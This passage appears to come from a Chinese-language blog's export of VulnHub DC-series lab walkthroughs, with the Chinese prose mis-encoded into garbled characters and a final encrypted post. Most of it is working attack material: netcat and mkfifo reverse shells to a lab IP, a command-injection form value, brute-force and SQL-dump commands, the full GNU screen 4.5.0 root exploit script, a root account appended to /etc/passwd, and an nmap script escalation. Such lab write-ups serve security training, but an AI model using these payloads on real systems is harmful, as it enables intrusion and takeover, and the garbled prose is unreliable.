<p>è´¦æˆ·ï¼šadmin å¯†ç ï¼šsnoopy</p>
<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230708194932.png"></p>
<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230708195019.png"></p>
<p>getshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.158.160/templates/beez3/zhou.php</span><br></pre></td></tr></table></figure>

<p>è€è§„çŸ©ï¼Œå¼¹åˆ°msfä¸­ï¼Œä½†msfè¿˜æ˜¯æ²¡æœ‰å»ºè®®</p>
<p>suid ä¹Ÿç”¨ä¸äº†å•¥</p>
<h3 id="linux-ç‰ˆæœ¬ææƒ"><a href="#linux-ç‰ˆæœ¬ææƒ" class="headerlink" title="linux ç‰ˆæœ¬ææƒ"></a>linux ç‰ˆæœ¬ææƒ</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/issue  //è·å–linux ç‰ˆæœ¬å·</span><br></pre></td></tr></table></figure>

<p>Ubuntu 16.04 LTS \n \l</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit buntu 16.04</span><br><span class="line">searchsploit -p 39772.txt</span><br></pre></td></tr></table></figure>

<p>Linux Kernel 4.4.0 (Ubuntu 14.04&#x2F;16.04 x86-64) - â€˜AF_PACKETâ€™ Race Condition Privilege Escalation</p>
<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230708204253.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/linux/local/39772.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/p4sschen/ubuntu16-39772.zip-exp</span><br></pre></td></tr></table></figure>

<p>ç”±äºåŸæ¥çš„payloadå·²ç»è¢«åˆ é™¤ï¼Œè¿™æ˜¯æœåˆ°çš„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unzip 39772.zip    è§£å‹39772.zipæ–‡ä»¶</span><br><span class="line">cd 39772             åˆ°39772ç›®å½•ä¸‹</span><br><span class="line">tar xvf exploit.tar    è§£å‹exploit.tarï¼Œå‘ç°ebpf_mapfd_doubleput_exploitç›®å½•</span><br><span class="line">cd ebpf_mapfd_doubleput_exploit   åˆ°è¯¥ç›®å½•ä¸‹ï¼Œå‘ç°compile.shæ–‡ä»¶</span><br><span class="line">chmod +x compile.sh     ç»™shæ–‡ä»¶èµ‹æƒ</span><br><span class="line">./compile.sh    æ‰§è¡Œshæ–‡ä»¶</span><br><span class="line">ls              æŸ¥çœ‹ï¼Œå‘ç°æ˜¯ç”±gccç¼–è¯‘çš„.cæ–‡ä»¶</span><br><span class="line">./doubleput     æ‰§è¡Œ.cæ–‡ä»¶</span><br></pre></td></tr></table></figure>



<h2 id="dc-4"><a href="#dc-4" class="headerlink" title="dc-4"></a>dc-4</h2><p>bp çˆ†ç ´</p>
<p>è´¦å·adminå¯†ç happy</p>
<p>åå¼¹shelll</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">radio=nc+192.168.158.129+12345+-e+/bin/bash&amp;submit=Run</span><br></pre></td></tr></table></figure>

<p>åˆ‡æ¢ç»ˆç«¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<p>åœ¨jim å¤‡ä»½æ–‡ä»¶ä¸‹å‘ç°å¯†ç </p>
<p>ssh çˆ†ç ´ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l jim -P 1.txt -I -t 64 ssh://192.168.158.163</span><br></pre></td></tr></table></figure>

<p>è§£å¯†ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jibril04</span><br></pre></td></tr></table></figure>

<p>sudo -l å‘ç°ç”¨ä¸äº†,æŸ¥çœ‹mbox,å‘ç°é‚®ç®±æç¤ºï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/mail</span><br><span class="line">cat jim å‘ç°charles çš„å¯†ç </span><br></pre></td></tr></table></figure>

<h3 id="teehee"><a href="#teehee" class="headerlink" title="teehee"></a>teehee</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;admin::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br><span class="line">å‚æ•°è§£é‡Š</span><br><span class="line">#å¦‚ï¼šadmin:x:0:0::/home/admin:/bin/bash</span><br><span class="line">#[ç”¨æˆ·å]ï¼š[å¯†ç ]ï¼š[UID]ï¼š[GID]ï¼š[èº«ä»½æè¿°]ï¼š[ä¸»ç›®å½•]ï¼š[ç™»å½•shell]</span><br><span class="line">&quot;-a&quot; é€‰é¡¹çš„ä½œç”¨ç­‰åŒäº &quot;&gt;&gt;&quot; å‘½ä»¤</span><br><span class="line">è¶…çº§ç”¨æˆ· UID=0 root</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su admin å³å¯</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/../06/bugku/QQ%E6%88%AA%E5%9B%BE20230714151401.png"></p>
<h2 id="dc-5"><a href="#dc-5" class="headerlink" title="dc-5"></a>dc-5</h2><p>æ–‡ä»¶åŒ…å«ï¼Œæ—¥å¿—åŒ…å«</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.158.129 7777</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å­˜åœ¨screen-4.5.0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit -p 41154.sh  //æŸ¥çœ‹æ¼æ´ä½ç½®</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230714234229.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># screenroot.sh</span><br><span class="line"># setuid screen v4.5.0 local root exploit</span><br><span class="line"># abuses ld.so.preload overwriting to get root.</span><br><span class="line"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span><br><span class="line"># HACK THE PLANET</span><br><span class="line"># ~ infodox (25/1/2017)</span><br><span class="line">echo &quot;~ gnu/screenroot ~&quot;</span><br><span class="line">echo &quot;[+] First, we create our shell and library...&quot;</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so...</span><br><span class="line">/tmp/rootshell  </span><br></pre></td></tr></table></figure>

<p>ä¸ºç¬¬ä¸€ä¸ªæ–‡ä»¶åä¸ºlibhax.c</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç”±äºï¼Œé¶æœºä¸Šæ²¡æœ‰gccç¯å¢ƒè¿™é‡Œé€‰æ‹©åœ¨kali ä¸Šç¼–è¯‘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒä¸ªæ–‡ä»¶åä¸ºrootshell.c å†…å®¹å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸‰ä¸ªæ–‡ä»¶åä¸º run.sh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so...</span><br><span class="line">/tmp/rootshell </span><br></pre></td></tr></table></figure>

<p>é‡è§äº†è¿™ä¸ªæŠ¥é”™</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tmp/rootshell: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34&#x27; not found (required by /tmp/rootshell)</span><br></pre></td></tr></table></figure>

<p>æ˜å¤©å†æ</p>
<h2 id="dc-6"><a href="#dc-6" class="headerlink" title="dc-6"></a>dc-6</h2><p>å’Œdc-2 ä¸€æ ·éœ€è¦è®¾ç½®hosts</p>
<p>æ‰“å¼€æ‰«æä¸€ä¸‹ï¼Œå‘ç°</p>
<p>æšä¸¾ç”¨æˆ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy -e</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">mark</span><br><span class="line">graham</span><br><span class="line">sarah</span><br><span class="line">jens</span><br></pre></td></tr></table></figure>

<p>å°†è¿™äº›ç”¨æˆ·åä¿å­˜ä¸ºè´¦å·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy/ -U users.txt -P passwords.txt</span><br></pre></td></tr></table></figure>

<p>è·å¾—å¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç”¨æˆ·åï¼šmark</span><br><span class="line">å¯†ç ï¼šhelpdesk01</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.158.129 4444</span><br></pre></td></tr></table></figure>

<p>å¼¹å‡ºæ¥shellä¹‹åï¼Œåˆ‡æ¢ç»ˆç«¯ï¼Œåœ¨markç”¨æˆ·ä¸‹å‘ç°æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Add new user: graham - GSo7isUM1D4 - done</span><br></pre></td></tr></table></figure>

<p>åƒæ˜¯ç”¨æˆ·å¯†ç </p>
<p>ssh <a href="mailto:&#x67;&#114;&#97;&#x68;&#97;&#x6d;&#x40;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#x2e;&#49;&#x35;&#x38;&#46;&#x31;&#57;&#51;">&#x67;&#114;&#97;&#x68;&#97;&#x6d;&#x40;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#x2e;&#49;&#x35;&#x38;&#46;&#x31;&#57;&#51;</a> ç™»å½• sudo -l</p>
<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230722173907.png"></p>
<p>è¿™ä¸ªç”¨æˆ·æœ‰è¿™ä¸ªæ–‡ä»¶æƒé™</p>
<h2 id="namp-ææƒ"><a href="#namp-ææƒ" class="headerlink" title="namp ææƒ"></a>namp ææƒ</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt;&gt; backups.sh</span><br><span class="line">sudo -u jens ./backups.sh</span><br><span class="line">åˆ‡æ¢ç”¨æˆ·</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;os.execute(&quot;/bin/bash&quot;)&#x27; &gt;zhou.nse</span><br><span class="line">sudo -u root nmap --script=zhou.nse</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230722175415.png"></p>
<h2 id="dc-7"><a href="#dc-7" class="headerlink" title="dc-7"></a>dc-7</h2><p>wapplayzer è¯†åˆ«æ˜¯drupal 8 cms ,é‚£ä¹ˆç”¨ä¹‹å‰çš„çš„è„šæœ¬å°±æ‰“ä¸äº†äº†</p>
<p>@DC7USERæœç´¢ä¸€ä¸‹ï¼Œå‘ç°githubèƒ½æœç´¢åˆ°æºç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$servername = &quot;localhost&quot;;</span><br><span class="line">	$username = &quot;dc7user&quot;;</span><br><span class="line">	$password = &quot;MdR3xOgB7#dW&quot;;</span><br><span class="line">	$dbname = &quot;Staff&quot;;</span><br><span class="line">	$conn = mysqli_connect($servername, $username, $password, $dbname);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ssh è¿æ¥å‘ç°èƒ½è¿æ¥çš„ä¸Šï¼Œä½†æ²¡æœ‰sudo -l å‘½ä»¤</p>
<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230724160925.png"></p>
<p>ä¸€ä¸ªæ–‡ä»¶ &#x2F;opt&#x2F;scripts&#x2F;backups.sh</p>
<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230724164057.png"></p>
<p>å‘ç°drush<a href="https://zhuanlan.zhihu.com/p/60880048">Drupal drush å¸¸ç”¨å‘½ä»¤ - çŸ¥ä¹ (zhihu.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/www/html/ </span><br><span class="line">drush user-password admin --password=&quot;123456&quot; </span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹admin çš„å¯†ç ä¸º123456</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -l /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æ–‡ä»¶è¯¦ç»†ä¿¡æ¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-rwxrwxr-x 1 root www-data 520 Aug 29  2019 /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure>

<p>æ‰€å±äºroot å’Œwww-data æ‰€ä»¥ä½¿ç”¨èšå‰‘å°±èƒ½å¤Ÿå†™å…¥å†…å®¹ä»è€Œè¿›è¡Œææƒï¼Œç”±äºè¯¥ç”¨æˆ·æ²¡æœ‰å†™å…¥æƒé™ï¼Œå¼€å§‹æ‰“web</p>
<p>è¿›å…¥åå°åï¼Œå‘ç°æ²¡æœ‰PHPæ’ä»¶ï¼Œå®‰è£…php ç¼–è¯‘å™¨</p>
<p>å®‰è£…è¿‡ç¨‹å¦‚å¤§ä½¬å†™çš„é‚£æ ·ï¼Œä¸å¤šèµ˜è¿°</p>
<p>åå¼¹shell </p>
<h3 id="ncæ— eå‚æ•°åå¼¹shell"><a href="#ncæ— eå‚æ•°åå¼¹shell" class="headerlink" title="ncæ— eå‚æ•°åå¼¹shell"></a>ncæ— eå‚æ•°åå¼¹shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.158.120 7878 &gt;/tmp/f</span><br></pre></td></tr></table></figure>

<p>å‘ç°å¼¹å‡ºæ¥çš„è¿˜æ˜¯www-data åæ¥æ‰çŸ¥é“ï¼Œéœ€è¦ç­‰15åˆ†é’Ÿåå°±æˆçš„</p>
<p>get root<img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230724220849.png"></p>
<p>ä¸‹ç­</p>
<h2 id="dc-8"><a href="#dc-8" class="headerlink" title="dc-8"></a>dc-8</h2><p>sqlmap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://192.168.158.196/?nid=1 --batch -D d7db -T users -C name,pass,uid --dump</span><br></pre></td></tr></table></figure>

<p>john</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF</span><br></pre></td></tr></table></figure>

<p>cat &#x2F;home&#x2F;zhou&#x2F;.john&#x2F;john.pot # æŸ¥çœ‹john ç ´è§£è¿‡çš„å¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">turtle</span><br></pre></td></tr></table></figure>

<p>ç™»å½•</p>
<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230727141533.png"></p>
<p>ï¼Œç„¶åéšä¾¿å†™æäº¤</p>
<p>msfæ¥å—shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230727141714.png"></p>
<p>å‘ç°exim4</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit exim4</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload /usr/share/exploitdb/exploits/linux/local/46996.sh /tmp/shell.sh</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./shell.sh -m netcat</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230727152125.png"></p>
<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230727152254.png"></p>
]]></content>
      <tags>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>ATT&amp;CKçº¢é˜Ÿè¯„ä¼°å®æˆ˜é¶åœºï¼ˆäºŒï¼‰</title>
    <url>/2023/07/28/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="f8f493fc2fc01a930f12b25bf291488d9da942d856c5da74514c059ecdc24930">10d79030e8222445804370796b90fca137dc2860cf36b04fb91b30c3ec8a08a6599f5dd584a26cbc47056206581075bcbab9f33c11f8ff1b0fead21785b09839eb07d48edd3e25c62b1150afec7494b5773c273b11757b0d828b0a860866b3433a0a44c08ee0e80eac92de66e9c694727d045184059b5c57af96016af72d8b850abda5bb93a08239768ccd02bb4fa457445834866f1bcf112c515dc027d5eb1c20e358d7c7b9d988074c077a014a45b6dfc6b542d7823c8e389f646739e9e642d012e579c39f947c1952a05686e41adca2cb76c84b3d61c4eb35d18e6510722ff441498978e44d02937a7fa06a840f6d9d14e982869a696c66ed37098765d7bfd3a35994ceac52ad87748b31e6c920b1762e150a5f9a6a035de35f2bce2b9793040f3feda0a257d30694709d768f4b08883ce85e96a0c6be4dde365e4bfb3e2a71e2db3e571a3de8a63f682edefe1b2b4e48bb576a541a8352ae7dac1a9a48add34dc0eb003374e9d214298011584ece0b77b14603694f175036a63d9a9f1f5231f7abe9de44e7466a64dd17da01c1a14697ac41ef3d47484c0d75a21f2bfd371043e0fe9b97c68a85d82e4581d0a2326c210404349915c1262f0777e09fc754f73c7e0d95158d2e70a265573beb4dbc58a6722cd3215b9f4a21f0db988b1cf1af43f167304879d67e490dfb42240f0718e5b134e39b4af1192b48716465206d8d5a163fb591d08652cffa8958e1ce0fdc3c399e27a6c52e7c0bd4b98ae4e613fc4598b88f67e4e820ffbe66d0a9b62705447cab0270fed63c82f8f4edcd7d582a76b9a7173fd9c00366d008fef9ac9d713c310001d0ef2daf5319ad146a4a907186f67d5c6650e170dca498f87b1d90f4867008fe2843a34705faac0cd3ce11fb5ac10178227139330db87b8814b4a23ac2b5f66f8c34fad8f30a70c3ccde8eb29553c7f898e22c82cbd729c3bb4c73cd1b804a67b40aeb5e0bd68b38b132cba204dde206c77ca79abbd6d6a303cd27d82b5d76c7ce604a3ae00e471d9b4d70c7c9ca98e290ffb90d845ca6fed381be7801e0b4f4affb6282c929546a57b3100eb7e2346328fa54ff96aa8bfab413b483976a6bc549aa99b2b1083078808c663b19f6aa71d4690e2825de6a26a79f29f473ce628253764d4dfdccb1bf97cda0692f38154b0fbb164949f266367a7695c5c006fd12ac2967c1cc33e7524662c278ea00e9bba7c3d6d6cfca1cf4f8ed206ab44b262f0a0520c09f113d490ddb4d16e03f88e933b0eab67078c99d35fad4d6fe6d7664872fec9e6202316f5ad918288fc5baa68746f5f14a3d00e429105dc14f0113446324ea2663ea75a79bebd10fa5fbbfa176cc5e78694f9c51af655e60e7734a0d871eaad7a79bf57bb049bb91bfb92860fc823a5ae289627d65499224fbea904423ec4d7064d64e63f025cbaa66b3789d32b45f72185b609d4516cb70cbcdf0f4e563081725880a4e9a7bd1bc18a4b8edbec8527208cdb2d09acefd7228c45edcc486e1a6f2508b3b918806a62fb7bfc157fc57c4fb92365b8583cd3a1b6aeeebc30769384cfe7eabac4dc983ef6cb0f8bff254c63944080db16d3b32976b83620c6e405fc5b2a5d438bc427470d15fe9c985a20040e1eb7248a0bf2d314df10c8228bd779c3fd0bc0352ad99a73fcaa62eda99a07b55af0c558940ab9d6f2662498e2cb84635febd5a59654b21c1a737f88011dccdc8f0809887f13cea931ced9b08ede04d2931d1edc859339398d1e43fbcdb9ccc3935e911fb1e4fb3836e38f9a2ff749e1a708850ff677938f5bd8efe68652faf6863af4970ceab0626caae637c1b7e44a2fb9ac0dd75f185783a817df2afb9998728feada2f30dcd6f17f3ea075e705873df3834ef6b3df79c63fc82b122ce6f161496256e3b2e1bcd69f6d53a8b9622117450d34e40de94f04155048fb11563058d8f101acbabb227c6691d159a94c7df5ff55ae70030b782318a8873f28678acdd3fb43db10fe8feb0eff3fa47ecb36da312c159d57d26f6b681d3dc3d313ee8abe830e0f912da58e38361a3b9b30a190000a81a606b2d2ee848614faf48e6b78f9deb822cf5c34629275667b7d3fa56414ea5fe7c439fd49aadb5aba38d991084e1668f9c06b8afc4166585ae6440e1912ebeac3254fb7bbbce97a6f267227f23865b7a511b5498ad4c85363f408d9199ce89a26cb97fae51fae500e574af766867ca85ec082addac48a1925140ec59d1f517ded32951eed1d2c1198b111c260b06375262b7ccb45757d8b797d4115f445793bb18e4d319910a11c8bf95f4f355522aafa810d4a86b1db0265fb105e1be4c0ba7f4a4142c22bc49907f28fd5238c7192102a8849b89e456cf3a1b9f5941daf22d8ca39a84a8d7c3b94dfe470f4fddb9d2b7ce0949120d6bb0169f9562938c5f506f9e32d9c23fe92eff3de7c1571208aa670a83cb5699d4d948fb525cd056a141ed69de150fa0fd2f1f1a8ee03c19153ac27569f4c7d15e3b57ab5399362a84a72e95e1d73004232b7f5251c44f7ea1d60ca5e5b52df9b0e98e1c591c5c6d84df4a307bf4dc4167c102b95c1af0aa0f0fdd147c1e636ae54a27e73d68438794571f0123395c3c9b1dbad14b4339cffebf33e9d1719e21f15ed3d527d892f96dcfe1db10bd07ec74b787dee1af37c11064ff5431a4367be454c82affb94f87bba6fdf4a6da336508542634db69d5fff0d643589c3d2e465a1de8cb15c5ada887518c6da9f7ab224d147fccc8e6df663d6e0e9b24930055007bd282fde51c1763268b219320e0fda754b38bfb0f2f868c2c8fe6b933a69b1d1a1a708635885b45ef3c779ce50752ca2fea09c9abf4d578515244a0ddb3a8ca59e5156b5dc9ee2f0230e746cc891b48d523b8f791ba6a0d7aed5e8fd996098adcc709d86ef8c5716f66177f9db8a61cd89f524824895c14dae1f672548fcd36c2bdd79f0fddb42d06efa416c5c071cf5bf3962e10369f42efc8ffb1aed0bba4418f1615746c83b5b6e40830b27e2f4ae1487b5e9c12a140f7046e47ef14b3a4bffd6003a4978634522d04a874d5e1debd55c29d89ffa8e599bd36a69251ae1be5c036cc56fcfc8cbf663624f33bdaf4d73d109b9801f2bee3c8f9807a06e56af8b2d0abd4501c684ecaa0b80cd923b92480a3811e4eaac49e04eb9d0a0a2f6549e9bf277a59d9bb1bac51d20fd578048ba754db99472523bd34cfdc20ce0ae61afb2f5fe41bc8300a8d6c5249d046b556d2376040e96fb6210a30248eefb3760a532d3d50189e1d77a63590f73fab8268d98be2121c962342d72824ccda5a37ce4ff6166252b50cabcef6cc4a5939b4ccecfa3f58fb173b77c254e19fc42fe32c95f7c494f53cb7762145d9356b661d0f8272d23cfcd8f87625b6c482deac0005f5ffa73c015ef2dc5bc66f0334d2afd6a9b2e3583980a356a6c32e4303c28ed32d739b1044010915a929bc25aa7edaece885d4868c9ed4197eec1e63ab77f909fba05904f2645647ca46b1fa4f307698479d2af8c32165b6e289be4ecd91a3a09267636c8cfb25770bd85c5d478e280e6f5616a9215ee8baebcda2020f60bc6304a78554d64506403b125526a226b610f3c9d157a8af3f73e277e35ea639fa420e0e08d77b224c22f4dfcf377f68325a3c2701ee29717440a99fd1e71c4b4fa5a8c8cbe8784b83a4f0c778c0633b7f2ef719b0462ac2c7f91fcf1bbe1ce32d5e311d2d3a4830fb97f93973926b95b949fdd7b9345e6fcb79cb9fed77e312892691c0d897039e7bb906930521d8a6ae05d5402511833539001bd374923dc8cfc7dccaa63a7e438d14c174f629eb0f9c19788a340f48cd809cde5dd4fb05b6061f92d7e7feea9739ce1c6dfef9e2d9dd5991d3f4591e4567c32a5f86053ba693e5ed2244877252072f5cd25281b97a6b66790eb95af1459fe976938f05bf0ae1778577b98ec909f8e01b2f8c0656d9b092f22478cbc4d4c6f356172f4558724989993c70b9da00ea819a2de1d83f48aa95f26b615ab8a0d29e9d66967c9a5e92289f22a816bb45de6df97c47c2f249c247f84ccab35538cf03c2286b76a1a441f9682bd318d0cb4d8a0146dbc7be08892922d381fc71728e95c410fb35593218ca325d0bbc7af11abe3cd9e3832503844bd87837b5e0acbddf62c1583ae89e0fc6fe127c96109c969bcfba503cef3bccc91275abd80682c5afc10252e8dc504f4fa15e1415c060aaa304ce1d6f73cc8527995c50fe1da0cf93ce7558064f45b3df9ed3e03116460164bbc38b7cd252f2e8dffc8917facb8fcbc164521ade228c29b83053f3cf5f5485c35a4462bd72c892b7e315565e97ad699bc83ebcbd2e704ec3b512bfcd9e1cff2d1a87ffc3fe3e944a0528ada45aba0031157003ff98854e222123985587b9a16551a965e5878e8884466195d85d2ee075763383a9ff3abc0299573b40a609aa185c90e596604d63b3b53f63c554ca5601a0d9c453257ab8d1674fa8985ae135736030ef2aa96ecf6cd29b2c7ce376b2281b64623c597dca74b1598e885bb4e0b1cfa4d0500b4989b7bed9c778ec26885f300d136f42a47101c1bd2047d10a1967b3db7b3abb70ef1df3eaaa13ea91a80e28d542077fd0c49330c426117f3fad997d22c14792c